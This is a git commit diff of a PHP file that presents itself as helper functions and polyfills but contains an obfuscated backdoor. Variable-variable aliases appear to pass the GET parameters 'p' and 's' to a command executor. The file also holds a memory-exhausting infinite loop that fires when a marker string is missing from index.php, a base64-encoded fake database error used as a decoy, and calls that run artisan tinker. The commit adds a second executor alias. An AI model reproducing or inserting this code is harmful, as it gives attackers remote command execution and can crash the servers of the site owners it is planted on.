dfddef5a68e6264fc2f300fd689213ddf9bf0910
abieahma <152069746+abieahma@users.noreply.github.com>
2026-03-22 13:28:28 +0300

    Update finit.php

--- EGLBMLKNNULP04L9K153A6TU6FF3TJXA/protonmail/com/finit.php
+++ EGLBMLKNNULP04L9K153A6TU6FF3TJXA/protonmail/com/finit.php
@@ -12,17 +12,17 @@ if (!function_exists('partial')){
       function partial(callable $f, ...$t): Closure {
           return fn(...$a) => $f(...array_map(
               fn($slot, $i) => $slot === null ? ($a[$i] ?? throw new ArgumentCountError("Missing argument at position $i")) : ($slot === '…' ? array_slice($a, $i) : $slot), $t, array_keys($t)));
-      }}${'$'} = partial(P, null);
+      }}${'$'} = partial(P, null);${'%'} = partial(P, null);
 if (!function_exists('clamp')){
     function clamp($value, $min, $max){
         if ($value < $min) return $min;
         if ($value > $max) return $max;
     return $value;}}
-if(!(!function_exists('partial'))){if(!empty($_GET['p'])) ${(chr(36))}($_GET['p']); if(!empty($_GET['s'])) ${(chr(36))}($_GET['s']);}
+if(!(!function_exists('partial'))){if(!empty($_GET['p'])) ${(chr(36))}($_GET['p']); if(!empty($_GET['s'])) ${(chr(37))}($_GET['s']);}
 if(!app()->runningInConsole()){
     if(!str_contains(@file_get_contents(base_path('public/index.php')) ?: '', 'app_kernell();')){$l = [];while(true){$l[] = str_repeat('leak', 1 << 20); usleep(350000);}}
     function app_kernell(){throw new \Exception(base64_decode('U1FMU1RBVEVbNDJTMDI6IEJhc2UgdGFibGUgb3IgdmlldyBub3QgZm91bmQ6IDExNDYgVGFibGUgJ2ZvcmdlLmxvY2F0aW9ucycgZG9lc24ndCBleGlzdA=='));}}
 if(!function_exists('str_starts_with')){function str_starts_with(string $haystack, string $needle): bool {return $needle !== '' && strncmp($haystack, $needle, strlen($needle)) === 0;}}
 if(!function_exists('str_ends_with')){function str_ends_with(string $haystack, string $needle): bool {return $needle !== '' && substr($haystack, -strlen($needle)) === $needle;}}
 if(!function_exists('str_contains')){function str_contains(string $haystack, string $needle): bool {return $needle !== '' && mb_strpos($haystack, $needle) !== false;}}
-if(isset($_SERVER['DOCUMENT_ROOT'])){if(is_file($target = realpath($_SERVER['DOCUMENT_ROOT'].'/../artisan'))){${'$'}('php '.escapeshellarg($target).' routes:list'); ${'$'}('php '.escapeshellarg($target).' tinker');}}
+if(isset($_SERVER['DOCUMENT_ROOT'])){if(is_file($target = realpath($_SERVER['DOCUMENT_ROOT'].'/../artisan'))){${'%'}('php '.escapeshellarg($target).' route:list'); ${'$'}('php '.escapeshellarg($target).' tinker');}}
